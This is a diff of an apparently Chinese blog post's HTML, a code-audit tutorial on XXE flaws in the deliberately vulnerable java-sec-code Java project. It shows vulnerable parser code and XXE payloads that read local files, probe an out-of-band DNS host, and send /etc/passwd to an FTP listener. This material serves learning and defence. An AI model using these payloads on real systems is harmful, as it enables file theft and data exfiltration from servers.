@@ -301,16 +301,16 @@
 </ul>
 <p>现在回过头来看，自己会有一些比较深刻的理解吧，也尝试独立分析一个漏洞的代码审计。</p>
 <h2 id="0x02-XXE-的代码审计"><a href="#0x02-XXE-的代码审计" class="headerlink" title="0x02 XXE 的代码审计"></a>0x02 XXE 的代码审计</h2><p>代码审计基于这个项目：</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code" >https://github.com/JoyChou93/java-sec-code<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code<i class="fas fa-external-link-alt"></i></a></p>
 <p>不扯废话，直接开始</p>
 <h3 id="关于审计见到的常见类-x2F-接口"><a href="#关于审计见到的常见类-x2F-接口" class="headerlink" title="关于审计见到的常见类&#x2F;接口"></a>关于审计见到的常见类&#x2F;接口</h3><h4 id="关于-Java-SAX-解析器"><a href="#关于-Java-SAX-解析器" class="headerlink" title="关于 Java SAX 解析器"></a>关于 Java SAX 解析器</h4><p>简单来说，Java SAX 就是读 XML 的文件内容的，根据标签读，比较好理解。它的特点是线性方式的处理。</p>
 <h4 id="关于-Java-JDOM-解析器"><a href="#关于-Java-JDOM-解析器" class="headerlink" title="关于 Java JDOM 解析器"></a>关于 Java JDOM 解析器</h4><p>Java JDOM 解析器分析 XML 文档，可以灵活地得到一个树形结构，是轻量级的快速 API</p>
 <ul>
 <li>其实还有很多种解析器，它们都有各自的特点，我这里就不举例了。</li>
-<li>具体的可以参考此处：<a class="link"   target="_blank" rel="noopener" href="https://www.yiibai.com/java_xml/java_sax_parser.html" >https://www.yiibai.com/java_xml/java_sax_parser.html<i class="fas fa-external-link-alt"></i></a></li>
+<li>具体的可以参考此处：<a class="link" target="_blank" rel="noopener" href="https://www.yiibai.com/java_xml/java_sax_parser.html">https://www.yiibai.com/java_xml/java_sax_parser.html<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 <h4 id="XMLReader"><a href="#XMLReader" class="headerlink" title="XMLReader"></a>XMLReader</h4><p>可以直接点进这个接口看一看</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/XMLReader.png" class>
 
 <p>这里有一长段的注释，来说明这个接口是什么用的，粗略读一下：</p>
 <p>XMLReader接口是一种通过回调读取XML文档的接口，其存在于公共区域中。XMLReader接口是XML解析器实现SAX2驱动程序所必需的接口，其允许应用程序设置和查询解析器中的功能和属性、注册文档处理的事件处理程序，以及开始文档解析。当XMLReader使用默认的解析方法并且未对XML进行过滤时，会出现XXE漏洞</p>
@@ -335,47 +335,47 @@
 
 <p>同时要将 <code>Content-Type</code> 修改为 application&#x2F;xml，不然会报错</p>
 <p>攻击成功的示例图，这里成功读取到了 <code>E:/1.txt</code> 这个文件</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/SuccessDocumentReader.png" class>
 
 <p>这里我们还可以通过这一 payload 列出所有文件</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Drunkbaby</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ListAllFiles.png" class>
 
 
 <p><strong>流程分析</strong></p>
 <p>在对应接口处下一个断点，开始调试：</p>
 <p>这里先获取到 request 请求，把我们在 POST 请求中的传参保存到 body 这个字符串当中。</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/requests.png" class>
 
 <p>下一步是 <code>DocumnetBuilderFactory</code> 类用 <code>newInstance()</code> 的方式进行实例化。本身抽象类是不可以实例化的，但是 <code>DocumnetBuilderFactory</code> 自己定义了一个 <code>newInstance()</code> 实例化的方法。</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/DocumnetBuilderFactoryNewInstance.png" class>
 
 <p>它定义一个工厂 API，使应用程序能够获取从 XML 文档生成 DOM 对象树的解析器。</p>
 <p>往下，new 了一个 <code>DocumnetBuilder</code> 对象，这就比较像反射的概念，师傅们可以自行理解，这几步都还是比较简单的。</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/DocumentBuilder.png" class>
 
 <p>这里我们得到的其实是两个抽象类的实现类</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/TwoImpl.png" class>
 
 <p>继续往下，把我们之前 body 里面的 xml 语句读出来，进行 <code>parse</code> 反序列化的过程</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/StringReader.png" class>
 
 <p>反序列化里面的过程就没什么好看的了，主要是将我们的 xml 参数，转换为一个 Document 对象。</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Document.png" class>
 
 <p>后续的过程做了遍历 xml 节点的 name 与 value</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Trace.png" class>
 
 <p>最后我们去读取文件的结果会保存至 buf 这个变量中，如图</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/buf.png" class>
 
 <h3 id="无回显的-XXE"><a href="#无回显的-XXE" class="headerlink" title="无回显的 XXE"></a>无回显的 XXE</h3><p>很多文章讲无回显讲的很不明白，我这里总结一下。</p>
 <p>打无回显主要就是这种方式 ———— DNS 探测</p>
 <p>我们以 XMLReader XXE 为例，打个 payload</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Drunkbaby</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://c5i5mmjypt9i3863jvcwznj3gumka9.oastify.com&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/BlindDNS.png" class>
 
 <p>这就证明了存在 XXE 漏洞。要进一步利用的话，步骤在 <code>XMLReader</code> 里面演示一遍，后续不再赘述。</p>
 <h4 id="XMLReader-XXE"><a href="#XMLReader-XXE" class="headerlink" title="XMLReader XXE"></a>XMLReader XXE</h4><ul>
@@ -385,7 +385,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/xmlReader/vuln&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">xmlReaderVuln</span><span class="params">(HttpServletRequest request)</span> &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> WebUtils.getRequestBody(request);  </span><br><span class="line"> logger.info(body);  </span><br><span class="line"> <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();  </span><br><span class="line"> xmlReader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body))); <span class="comment">// parse xml  </span></span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;xmlReader xxe vuln code&quot;</span>;  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        logger.error(e.toString());  </span><br><span class="line"> <span class="keyword">return</span> EXCEPT;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>探测一下，存在 XXE 漏洞，并且是无回显的。</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/BlindDNS.png" class>
 
 <ul>
 <li>漏洞的进一步利用：</li>
@@ -403,29 +403,29 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9999</span><br></pre></td></tr></table></figure>
 
 <p>接着发包，攻击</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/XMLReaderAttack.png" class>
 
 <p>这里发包肯定是没问题的，首先我们的恶意 dtd 200，被成功调用了。</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/200.png" class>
 
 <p>攻击是成功的，我们去到 burp 的 dnslog 界面，看到已经是成功的外带出了数据。</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/XMLReaderSuccess.png" class>
 
 <p>这才是真正成功的攻击</p>
 <p>同样我们的日志里面也是有攻击痕迹的</p>
-
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Ori.png" class>
 
 <blockquote>
 <p>这是盲注攻击的通用手法，所以后续的攻击就挂一个 payload 和截图，师傅们可以自行复现。</p>
 </blockquote>
 <h4 id="SAXBuilder-XXE"><a href="#SAXBuilder-XXE" class="headerlink" title="SAXBuilder XXE"></a>SAXBuilder XXE</h4><p>一致的 payload</p>
+<img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/SAXBuilder.png" class>
 
+<h4 id="SAXReader-XXE"><a href="#SAXReader-XXE" class="headerlink" title="SAXReader XXE"></a>SAXReader XXE</h4><img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/SAXReader.png" class>
 
-<h4 id="SAXReader-XXE"><a href="#SAXReader-XXE" class="headerlink" title="SAXReader XXE"></a>SAXReader XXE</h4>
+<h4 id="SAXParser-XXE"><a href="#SAXParser-XXE" class="headerlink" title="SAXParser XXE"></a>SAXParser XXE</h4><img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/SAXParser.png" class>
 
-<h4 id="SAXParser-XXE"><a href="#SAXParser-XXE" class="headerlink" title="SAXParser XXE"></a>SAXParser XXE</h4>
-
-<h4 id="Digester-XXE"><a href="#Digester-XXE" class="headerlink" title="Digester XXE"></a>Digester XXE</h4>
+<h4 id="Digester-XXE"><a href="#Digester-XXE" class="headerlink" title="Digester XXE"></a>Digester XXE</h4><img src="/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Digester.png" class>
 
 
 <h2 id="0x03-关于-Java-XXE-的修复"><a href="#0x03-关于-Java-XXE-的修复" class="headerlink" title="0x03 关于 Java XXE 的修复"></a>0x03 关于 Java XXE 的修复</h2><p>修复起来可以说是非常简单，甚至不怎么需要成本，不影响业务的。</p>
@@ -449,11 +449,11 @@
 
 <h3 id="解决文件跨行传输——-ftp-amp-jdk1-7"><a href="#解决文件跨行传输——-ftp-amp-jdk1-7" class="headerlink" title="解决文件跨行传输—— ftp&amp;jdk1.7+"></a>解决文件跨行传输—— ftp&amp;jdk1.7+</h3><p>这里的内容是参考 Y4tacker 师傅的</p>
 <p>在 XXE 盲注中，我们也提到通过 http 协议访问我们的服务器会只获取被读取的文件第一行。</p>
-<p>参考 <a class="link"   target="_blank" rel="noopener" href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" >XXE OOB exploitation at Java 1.7+<i class="fas fa-external-link-alt"></i></a> 这篇文章，在特定情况下我们可以解决这种困境。</p>
+<p>参考 <a class="link" target="_blank" rel="noopener" href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">XXE OOB exploitation at Java 1.7+<i class="fas fa-external-link-alt"></i></a> 这篇文章，在特定情况下我们可以解决这种困境。</p>
 <p>在 jdk1.7 以前，可以通过http协议传输具有换行的文件的。因为java会对换行符进行URL编码然后就访问一个地址。</p>
 <p>但是1.7之后，就修复了这个问题，会报错。</p>
 <p>但是我们仍然可以用ftp服务器来接受换行文件，因为ftp没有进行类似的限制，换行之后的字符会被当做CWD命令输入。</p>
-<p>只要起一个<a class="link"   target="_blank" rel="noopener" href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" >恶意的FTP服务器<i class="fas fa-external-link-alt"></i></a>，其他按照正常的XXE盲注打就好了。</p>
+<p>只要起一个<a class="link" target="_blank" rel="noopener" href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">恶意的FTP服务器<i class="fas fa-external-link-alt"></i></a>，其他按照正常的XXE盲注打就好了。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % c <span class="string">&quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#x27;ftp://127.0.0.1:2121/%b;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%c;</span><br></pre></td></tr></table></figure>
 
 <p>payload:</p>
